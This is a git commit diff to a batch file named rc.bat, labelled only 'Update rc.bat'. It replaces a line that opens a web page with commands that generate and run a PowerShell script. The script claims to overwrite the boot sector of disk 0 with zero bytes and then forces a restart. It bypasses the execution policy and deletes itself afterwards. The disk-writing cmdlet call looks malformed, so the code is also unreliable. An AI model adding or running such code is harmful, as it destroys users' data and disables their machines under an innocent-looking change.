97fcad3339c218e456eabee69726dc342aad4509
crudekiss <176537984+crudekiss@users.noreply.github.com>
2025-04-13 15:01:57 +0200

    Update rc.bat

--- rc/rc.bat
+++ rc/rc.bat
@@ -1,2 +1,4 @@
 @echo off
-start /max http://crudekiss.github.io/list
+echo Write-Host "Overwriting boot sector..."; $Drive = (Get-Disk | Where-Object {$_.Number -eq 0}).Number; $Bytes = New-Object Byte[] 512; Set-PhysicalDisk -Number $Drive -InputObject $Bytes -Offset 0; Write-Host "Forcing restart..."; Restart-Computer -Force > temp.ps1
+powershell -ExecutionPolicy Bypass -File temp.ps1
+del temp.ps1
